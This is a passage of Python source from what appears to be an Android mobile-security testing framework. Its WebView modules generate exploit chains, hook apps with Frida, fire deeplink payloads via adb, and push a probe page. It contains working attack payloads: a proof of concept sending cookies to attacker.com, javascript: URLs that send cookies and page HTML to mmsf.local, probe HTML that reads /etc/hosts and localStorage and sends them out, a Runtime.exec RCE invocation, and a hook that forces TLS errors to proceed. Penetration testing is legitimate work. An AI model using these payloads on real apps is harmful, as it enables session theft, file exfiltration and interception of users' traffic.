            if reparenting_on:
                print(Fore.RED + "  allowTaskReparenting=true  ← StrandHogg candidate" + Fore.RESET)
            print()

            # ── 4. Per-class findings ─────────────────────────────────────────
            print(Fore.CYAN + "── Per-Class WebView Findings " + "─"*42 + Fore.RESET)
            for spath, d in sorted(class_data.items(), key=lambda x: x[1]["fname"]):
                flags   = []
                if d["js_enabled"]:           flags.append(("HIGH",     "JS=ON"))
                if d["univ_file"]:            flags.append(("CRITICAL", "UniversalFileAccess=ON"))
                if d["file_from_file"]:       flags.append(("HIGH",     "FileAccessFromFileURLs=ON"))
                if d["file_access"]:          flags.append(("MEDIUM",   "FileAccess=ON"))
                if d["mixed_content"]:        flags.append(("HIGH",     "MixedContent=ALWAYS_ALLOW"))
                if d["dom_storage"]:          flags.append(("LOW",      "DomStorage=ON"))
                if d["add_js_iface"]:
                    for iface in d["add_js_iface"]:
                        flags.append(("CRITICAL", f"addJavascriptInterface('{iface}')"))
                if d["load_url"]:             flags.append(("INFO",     "loadUrl() present"))
                if d["url_from_intent"]:      flags.append(("HIGH",     "URL from Intent/Deeplink"))
                if d["no_override_url"]:      flags.append(("HIGH",     "shouldOverrideUrlLoading ABSENT"))
                if d["ssl_proceed"]:          flags.append(("CRITICAL", "onReceivedSslError→proceed() — cert bypass"))

                if not flags:
                    continue

                print(f"\n  {Fore.WHITE}Class:{Fore.RESET} {d['fname']}  ({d['class']})")
                for sev, msg in flags:
                    c = Fore.RED if sev == "CRITICAL" else Fore.YELLOW if sev == "HIGH" else Fore.BLUE if sev == "MEDIUM" else Fore.WHITE
                    print(f"    {c}[{sev}]{Fore.RESET} {msg}")
            print()

            # ── 5. Exploit chain synthesis ────────────────────────────────────
            print(Fore.CYAN + "── Exploit Chain Analysis " + "─"*46 + Fore.RESET)
            chains_found = []

            for spath, d in class_data.items():
                cls   = d["class"]
                fname = d["fname"]

                # Map class to exported/deeplink activity
                # Simple heuristic: the class itself or its outer class is in exported_activities
                cls_exported  = any(e.endswith(cls.split(".")[-1]) or cls.endswith(e.split(".")[-1])
                                    for e in exported_activities)
                cls_deeplink  = any(e.endswith(cls.split(".")[-1]) or cls.endswith(e.split(".")[-1])
                                    for e in deeplink_activities)
                reachable     = cls_exported or cls_deeplink or d["url_from_intent"]
                reachable_str = (
                    Fore.GREEN + "✔ reachable via exported activity" + Fore.RESET if cls_exported
                    else Fore.GREEN + "✔ reachable via deeplink" + Fore.RESET if cls_deeplink
                    else Fore.YELLOW + "⚠ reachability unclear (not in manifest exports)" + Fore.RESET
                )

                # Chain A: JS-interface → RCE
                if d["js_enabled"] and d["add_js_iface"]:
                    ifaces = ", ".join(d["add_js_iface"])
                    severity = "EXPLOITABLE" if reachable else "LIKELY_EXPLOITABLE"
                    chains_found.append({
                        "id":       "A",
                        "severity": severity,
                        "title":    "JavaScript Interface → RCE",
                        "class":    fname,
                        "reach":    reachable_str,
                        "chain": [
                            f"JS enabled (setJavaScriptEnabled=true)",
                            f"Interface(s) exposed: {ifaces}",
                            "Attacker-controlled URL loads JS that calls interface methods",
                            "→ arbitrary Java code execution in app context",
                        ],
                        "poc": f"adb shell am start -n {app_package}/.WebViewActivity \\\n"
                               f"          --es url \"javascript:{d['add_js_iface'][0]}.getClass().forName('java.lang.Runtime').getMethod('exec',String.class).invoke(null,'id')\"",
                        "requires_user_url": d["url_from_intent"],
                    })

                # Chain B: Universal file access + JS → exfil
                if d["js_enabled"] and d["univ_file"]:
                    severity = "EXPLOITABLE" if reachable else "LIKELY_EXPLOITABLE"
                    chains_found.append({
                        "id":       "B",
                        "severity": severity,
                        "title":    "Universal File Access → arbitrary file read",
                        "class":    fname,
                        "reach":    reachable_str,
                        "chain": [
                            "JS enabled",
                            "setAllowUniversalAccessFromFileURLs=true  (SOP disabled)",
                            "Open file:///data/data/<pkg>/... via file:// URL",
                            "JS XHR reads any app-private file → exfil via img.src",
                        ],
                        "poc": f"# Push probe HTML, open in app:\n"
                               f"adb shell am start -n {app_package}/.WebViewActivity \\\n"
                               f"          --es url \"file:///sdcard/probe.html\"",
                        "requires_user_url": d["url_from_intent"],
                    })

                # Chain C: Open redirect / URL scheme confusion
                if d["load_url"] and d["url_from_intent"] and d.get("no_override_url", False):
                    severity = "EXPLOITABLE" if reachable else "LIKELY_EXPLOITABLE"
                    chains_found.append({
                        "id":       "C",
                        "severity": severity,
                        "title":    "Open Redirect / URL-scheme confusion",
                        "class":    fname,
                        "reach":    reachable_str,
                        "chain": [
                            "loadUrl receives URL directly from Intent",
                            "No shouldOverrideUrlLoading → all schemes forwarded to WebView",
                            "→ javascript: scheme executes attacker JS; intent: can launch arbitrary components",
                        ],
                        "poc": f"adb shell am start -n {app_package}/.WebViewActivity \\\n"
                               f"          --es url \"javascript:alert(document.cookie)\"",
                        "requires_user_url": True,
                    })

                # Chain D: SSL MITM
                if d["ssl_proceed"]:
                    severity = "EXPLOITABLE" if reachable else "LIKELY_EXPLOITABLE"
                    chains_found.append({
                        "id":       "D",
                        "severity": severity,
                        "title":    "SSL Certificate bypass → MITM",
                        "class":    fname,
                        "reach":    reachable_str,
                        "chain": [
                            "onReceivedSslError calls handler.proceed() unconditionally",
                            "Any certificate (self-signed, expired, wrong host) is accepted",
                            "→ intercept HTTPS with Burp / mitmproxy without extra config",
                        ],
                        "poc": "# No APK modification needed; set device proxy to Burp and intercept",
                        "requires_user_url": False,
                    })

                # Chain E: XSS via deeplink (JS on, no interface, but user-controlled URL)
                if d["js_enabled"] and d["url_from_intent"] and not d["add_js_iface"]:
                    severity = "EXPLOITABLE" if reachable else "LIKELY_EXPLOITABLE"
                    chains_found.append({
                        "id":       "E",
                        "severity": severity,
                        "title":    "Stored/Reflected XSS via deeplink URL",
                        "class":    fname,
                        "reach":    reachable_str,
                        "chain": [
                            "JS enabled",
                            "URL sourced from Intent extra / deeplink parameter",
                            "No addJavascriptInterface → limited to DOM/cookie theft",
                            "→ steal session cookies / auth tokens rendered in WebView",
                        ],
                        "poc": f"adb shell am start -a android.intent.action.VIEW \\\n"
                               f"          -d \"myapp://open?url=javascript:document.location='http://attacker.com/?c='+document.cookie\" \\\n"
                               f"          {app_package}",
                        "requires_user_url": True,
                    })

            if not chains_found:
                print(Fore.GREEN + "\n[+] No actionable exploit chains identified." + Fore.RESET)
                print(Fore.YELLOW + "    Flags were found but either the activity is not exported or\n"
                      "    the URL is not user-controlled — exploitation requires additional context." + Fore.RESET)
            else:
                for ch in chains_found:
                    colour = Fore.RED if ch["severity"] == "EXPLOITABLE" else Fore.YELLOW
                    print(f"\n  {colour}[{ch['severity']}]{Fore.RESET}  Chain {ch['id']}: {Fore.WHITE}{ch['title']}{Fore.RESET}")
                    print(f"  Class    : {ch['class']}")
                    print(f"  Reach    : {ch['reach']}")
                    print(f"  Requires user-controlled URL: {'YES' if ch['requires_user_url'] else 'NO (passive)'}")
                    print(f"  {Fore.CYAN}Attack chain:{Fore.RESET}")
                    for step in ch["chain"]:
                        print(f"    → {step}")
                    print(f"  {Fore.CYAN}PoC:{Fore.RESET}")
                    for line in ch["poc"].splitlines():
                        print(f"    {Fore.WHITE}{line}{Fore.RESET}")

            # ── 6. Summary table ──────────────────────────────────────────────
            print(Fore.CYAN + "\n── Summary " + "─"*60 + Fore.RESET)
            total_classes = len(class_data)
            exploitable   = sum(1 for c in chains_found if c["severity"] == "EXPLOITABLE")
            likely        = sum(1 for c in chains_found if c["severity"] == "LIKELY_EXPLOITABLE")

            print(f"  Classes with WebView code : {total_classes}")
            print(f"  Exploit chains found      : {len(chains_found)}")
            print(f"  {Fore.RED}EXPLOITABLE (confirmed)   : {exploitable}{Fore.RESET}")
            print(f"  {Fore.YELLOW}LIKELY_EXPLOITABLE        : {likely}{Fore.RESET}")
            if target_sdk and target_sdk < 17:
                print(Fore.RED + "\n  ⚠ CRITICAL: targetSdkVersion < 17 — ALL addJavascriptInterface calls\n"
                      "    are exploitable without @JavascriptInterface annotation!" + Fore.RESET)
            print()
            return 1

        elif cmd == "show":
            print_show_table([
                {"name": "APK_PATH",     "value": data.get("apk_path", ""),
                 "description": "Path to the .apk file (auto-decoded with apktool)", "required": False},
                {"name": "DECODED_PATH", "value": data.get("decoded_path", ""),
                 "description": "Path to existing apktool decoded directory",        "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    def webview_frida(self, cmd, data):
        if cmd == "run":
            if data["mode"] == '-R' and not data["host"]:
                print(Fore.RED + "[-] Set HOST for Remote mode!" + Fore.RESET)
                return 0
            if not data["app"]:
                print(Fore.RED + "[-] Set APP first!" + Fore.RESET)
                return 0

            frida_script = r"""
    Java.perform(function() {
        var WV  = Java.use('android.webkit.WebView');
        var WVC = Java.use('android.webkit.WebViewClient');

        WV.loadUrl.overload('java.lang.String').implementation = function(url) {
            send('[loadUrl] ' + url);
            return this.loadUrl(url);
        };
        WV.loadUrl.overload('java.lang.String','java.util.Map').implementation = function(url, h) {
            send('[loadUrl+headers] ' + url);
            return this.loadUrl(url, h);
        };
        try {
            WV.evaluateJavascript.implementation = function(js, cb) {
                send('[evaluateJavascript] ' + js.substring(0, 300));
                return this.evaluateJavascript(js, cb);
            };
        } catch(e) {}
        WV.addJavascriptInterface.implementation = function(obj, name) {
            send('[addJavascriptInterface] name=' + name + '  class=' + obj.$className);
            return this.addJavascriptInterface(obj, name);
        };
        WVC.onReceivedSslError.implementation = function(view, handler, err) {
            send('[onReceivedSslError] proceeding despite: ' + err.toString());
            handler.proceed();
        };
        send('[MMSF] WebView hooks active.');
    });
    """
            import frida as _frida, signal as _signal

            def on_message(message, _data):
                if message.get("type") == "send":
                    payload = message.get("payload", "")
                    colour = (Fore.RED   if any(x in payload for x in ["addJavascript","onReceivedSsl"])
                        else Fore.CYAN  if "[loadUrl]" in payload
                        else Fore.GREEN if "[MMSF]"    in payload
                        else Fore.YELLOW)
                    print(colour + "[WebView] " + payload + Fore.RESET)
                elif message.get("type") == "error":
                    print(Fore.RED + "[-] " + str(message.get("stack","")) + Fore.RESET)

            try:
                device  = (_frida.get_device_manager().add_remote_device(data["host"])
                        if data["mode"] == "-R" else _frida.get_usb_device())
                print(Fore.YELLOW + f"[*] Attached to {data['app']} — press Ctrl+C to stop." + Fore.RESET)

                if data["method"] == "-f":
                    pid     = device.spawn([data["app"]])
                    session = device.attach(pid)
                else:
                    session = device.attach(data["app"])

                script = session.create_script(frida_script)
                script.on("message", on_message)
                script.load()

                if data["method"] == "-f" and not data.get("pause"):
                    device.resume(pid)

                _signal.pause()   # block until Ctrl+C

            except KeyboardInterrupt:
                print(Fore.YELLOW + "\n[*] Stopped." + Fore.RESET)
            except Exception as e:
                print(Fore.RED + f"[-] {e}" + Fore.RESET)
                return 0
            finally:
                try: script.unload(); session.detach()
                except: pass
            return 1

        elif cmd == "show":
            print_show_table([
                {"name":"MODE",   "value": data["mode"],   "description":"Serial(-U) or Remote(-R)","required":False},
                {"name":"APP",    "value": data["app"],    "description":"Package name"},
                {"name":"HOST",   "value": data["host"],   "description":"Remote host","required":False},
                {"name":"METHOD", "value": data["method"], "description":"Spawn(-f) or Attach(-F)","required":False},
                {"name":"PAUSE",  "value": data.get("pause",""), "description":"Keep paused after spawn","required":False}])
            return 0
        elif cmd == "exit":  quit_app()
        elif cmd == "back":  back(); return 2

    def webview_deeplink(self, cmd, data):
        """
        Send deep link payloads via ADB am start to probe WebView
        URL handlers for javascript: and file:// injection.
        """
        if cmd == "run":
            pkg    = data.get("package", "")
            scheme = data.get("url_scheme", "")
            if not pkg or not scheme:
                print(Fore.RED + "[-] Set PACKAGE and URL_SCHEME first!" + Fore.RESET)
                return 0

            key     = data.get("extra_key", "url")
            payload_type = data.get("payloads", "default")
            adb     = Constants.ADB.value

            payloads = {
                "default": [
                    "javascript:alert(document.domain)",
                    "javascript:document.location='http://mmsf.local/?c='+document.cookie",
                    "file:///etc/hosts",
                    "file:///data/data/" + pkg + "/shared_prefs/",
                    "content://com.android.contacts/contacts",
                ],
                "file":    ["file:///etc/hosts", "file:///proc/version", "file:///data/data/" + pkg + "/databases/"],
                "js":      ["javascript:alert(1)", "javascript:void(fetch('http://mmsf.local/?x='+btoa(document.body.innerHTML)))"]
            }
            selected = payloads.get(payload_type, payloads["default"])

            print(Fore.CYAN + f"\n[*] Probing {pkg} with {len(selected)} payload(s)..." + Fore.RESET)
            for p in selected:
                full_uri = f"{scheme}://{p}" if not p.startswith(("javascript:", "file:", "content:")) else p
                cmd_parts = [adb, "shell", "am", "start",
                             "-a", "android.intent.action.VIEW",
                             "-d", full_uri,
                             "--es", key, p,
                             pkg]
                print(Fore.YELLOW + f"  → {p}" + Fore.RESET)
                subprocess.run(cmd_parts, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                import time; time.sleep(1)

            print(Fore.GREEN + "[+] Payload sequence sent. Check device / Frida output." + Fore.RESET)
            return 1

        elif cmd == "show":
            print_show_table([
                {"name": "PACKAGE",    "value": data.get("package", ""),    "description": "Target package name"},
                {"name": "URL_SCHEME", "value": data.get("url_scheme", ""), "description": "App URL scheme (e.g. myapp)"},
                {"name": "EXTRA_KEY",  "value": data.get("extra_key", ""),  "description": "Intent extra key for the URL. Default: url", "required": False},
                {"name": "PAYLOADS",   "value": data.get("payloads", ""),   "description": "Payload set: default | file | js", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    def webview_fileaccess(self, cmd, data):
        """
        Push a probe HTML file to device and open it in the target app's WebView
        to test file://, content://, android_asset:// protocol handlers.
        """
        if cmd == "run":
            pkg  = data.get("package", "")
            if not pkg:
                print(Fore.RED + "[-] Set PACKAGE first!" + Fore.RESET)
                return 0

            probe  = data.get("probe", "file")
            fpath  = data.get("file_path", "/sdcard/mmsf_probe.html")
            adb    = Constants.ADB.value

            probe_html = """<!DOCTYPE html><html><head><meta charset='utf-8'></head><body>
<script>
function exfil(data) {
    var img = new Image();
    img.src = 'http://mmsf.local:8888/?data=' + encodeURIComponent(data);
}
// file:// same-origin read
try {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'file:///etc/hosts', false);
    xhr.send();
    exfil('hosts:' + xhr.responseText);
} catch(e) { exfil('file_err:' + e); }
// localStorage
try { exfil('ls:' + JSON.stringify(localStorage)); } catch(e) {}
document.body.innerHTML = '<h2>MMSF WebView Probe Active</h2><p>Check mmsf.local:8888 for data.</p>';
</script></body></html>
"""
            # Write probe locally, push to device
            local_probe = os.path.expanduser("~/.mmsf/loot/webview_probe.html")
            os.makedirs(os.path.dirname(local_probe), exist_ok=True)
            with open(local_probe, "w") as f:
                f.write(probe_html)

            print(Fore.YELLOW + f"[*] Pushing probe to {fpath} ..." + Fore.RESET)
            subprocess.run([adb, "push", local_probe, fpath])

            uri_map = {
                "file":    f"file://{fpath}",
                "content": f"content://com.android.externalstorage.documents/document/primary%3Ammsf_probe.html",
                "asset":   f"file:///android_asset/mmsf_probe.html"
            }
            uri = uri_map.get(probe, f"file://{fpath}")

            print(Fore.YELLOW + f"[*] Opening URI in {pkg}: {uri}" + Fore.RESET)
            subprocess.run([adb, "shell", "am", "start",
                           "-a", "android.intent.action.VIEW",
                           "-d", uri, pkg])

            print(Fore.GREEN + "[+] Probe launched. Listen on port 8888 for exfil callbacks:" + Fore.RESET)
            print(Fore.WHITE  + "    python3 -m http.server 8888  # or nc -lvp 8888" + Fore.RESET)
            return 1

        elif cmd == "show":
            print_show_table([
                {"name": "PACKAGE",   "value": data.get("package", ""),   "description": "Target app package"},
                {"name": "FILE_PATH", "value": data.get("file_path", ""), "description": "On-device path for probe HTML. Default: /sdcard/mmsf_probe.html", "required": False},
                {"name": "PROBE",     "value": data.get("probe", ""),     "description": "Protocol to test: file | content | asset. Default: file", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    def webview_cleanup(self, cmd, data):
        if cmd == "run":
            if data["mode"] == '-R' and not data["host"]:
                print(Fore.RED + "[-] Set HOST for Remote mode!" + Fore.RESET)
                return 0
            if not data["app"]:
                print(Fore.RED + "[-] Set APP first!" + Fore.RESET)
                return 0

            frida_script = r"""
    Java.perform(function() {
        var WV = Java.use('android.webkit.WebView');
        var CM = Java.use('android.webkit.CookieManager');
        var WS = Java.use('android.webkit.WebStorage');
        var called = { cache:false, cookies:false, history:false, storage:false };

        WV.clearCache.implementation = function(inc) {
            called.cache = true;
            send('[CLEANUP] clearCache(' + inc + ')');
            return this.clearCache(inc);
        };
        WV.clearHistory.implementation = function() {
            called.history = true;
            send('[CLEANUP] clearHistory()');
            return this.clearHistory();
        };
        try {
            CM.removeAllCookies.implementation = function(cb) {
                called.cookies = true;
                send('[CLEANUP] CookieManager.removeAllCookies()');
                return this.removeAllCookies(cb);
            };
        } catch(e) {
            CM.removeAllCookies.overload().implementation = function() {
                called.cookies = true;
                send('[CLEANUP] CookieManager.removeAllCookies()');
                return this.removeAllCookies();
            };
        }
        WS.deleteAllData.implementation = function() {
            called.storage = true;
            send('[CLEANUP] WebStorage.deleteAllData()');
            return this.deleteAllData();
        };

        setTimeout(function() {
            var missing = [];
            if (!called.cache)   missing.push('clearCache');
            if (!called.cookies) missing.push('removeAllCookies');
            if (!called.history) missing.push('clearHistory');
            if (!called.storage) missing.push('deleteAllData');
            send(missing.length ? '[MISSING] Not called: ' + missing.join(', ')
                                : '[OK] All cleanup methods called.');
            send('__DONE__');
        }, 15000);

        send('[MMSF] Cleanup hooks active — trigger logout within 15s.');
    });
    """
            import frida as _frida, threading as _threading

            done = _threading.Event()

            def on_message(message, _data):
                if message.get("type") == "send":
                    payload = message.get("payload", "")
                    if payload == "__DONE__": done.set(); return
                    colour = (Fore.RED    if "[MISSING]" in payload
                        else Fore.GREEN  if "[OK]"      in payload
                        else Fore.CYAN   if "[CLEANUP]" in payload
                        else Fore.GREEN)
                    print(colour + "[Cleanup] " + payload + Fore.RESET)
                elif message.get("type") == "error":
                    print(Fore.RED + "[-] " + str(message.get("stack","")) + Fore.RESET)
                    done.set()

            try:
                device  = (_frida.get_device_manager().add_remote_device(data["host"])
                        if data["mode"] == "-R" else _frida.get_usb_device())
                print(Fore.YELLOW + f"[*] Attached to {data['app']} — trigger logout now (15s)." + Fore.RESET)

                if data.get("method", "-F") == "-f":
                    pid     = device.spawn([data["app"]])
                    session = device.attach(pid)
                    script  = session.create_script(frida_script)
                    script.on("message", on_message)
                    script.load()
                    if not data.get("pause"): device.resume(pid)
                else:
                    session = device.attach(data["app"])
                    script  = session.create_script(frida_script)
                    script.on("message", on_message)
                    script.load()

                done.wait(timeout=20)

            except KeyboardInterrupt:
                print(Fore.YELLOW + "\n[*] Stopped." + Fore.RESET)
            except Exception as e:
                print(Fore.RED + f"[-] {e}" + Fore.RESET)
                return 0
            finally:
                try: script.unload(); session.detach()
                except: pass
            return 1

        elif cmd == "show":
            print_show_table([
                {"name":"MODE",   "value": data["mode"],            "description":"Serial or Remote","required":False},
                {"name":"APP",    "value": data["app"],             "description":"Package name"},
                {"name":"HOST",   "value": data["host"],            "description":"Remote host","required":False},
                {"name":"METHOD", "value": data.get("method","-F"), "description":"Spawn(-f) or Attach(-F)","required":False}])
            return 0
        elif cmd == "exit":  quit_app()
        elif cmd == "back":  back(); return 2

    def hook_task_hijacking(self, cmd, data):
        """
        Background Frida hook for Task Hijacking (StrandHogg 1.0) analysis.
        The frida session runs in a daemon thread — MMSF stays fully interactive.
        New activity events print live as they fire.
        """
        self._frida.config = data

        if cmd == "run":
            if self._frida.config["mode"] == '-R':
                if not self._frida.config["host"]:
                    print(Fore.RED + "[-] Set HOST first (MODE is REMOTE)!" + Fore.RESET)
                    return 0
            if self._frida.config["app"]:
                threading.Thread(
                    target=self._frida.hook_task_hijacking,
                    args=([])).start()
                return 1
            else:
                print(Fore.RED + "[-] Set APP first!" + Fore.RESET)
                return 0

        elif cmd == "stop":
            self._frida.stop_task_hijacking()
            return 1

        elif cmd == "show":
            print_show_table([
                {"name": "MODE",   "value": "SERIAL" if self._frida.config["mode"] == "-U" else "REMOTE",
                 "description": "Serial or Remote. Default: SERIAL", "required": False},
                {"name": "APP",    "value": self._frida.config["app"],
                 "description": "Target package: com.mmsf.taskhijackingvictim"},
                {"name": "HOST",   "value": self._frida.config["host"],
                 "description": "Host if MODE=REMOTE. Default: 127.0.0.1", "required": False},
                {"name": "METHOD", "value": "SPAWN" if self._frida.config["method"] == '-f' else "FRONTMOST",
                 "description": "Attach method. Default: SPAWN", "required": False},
            ])
            return 0

        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2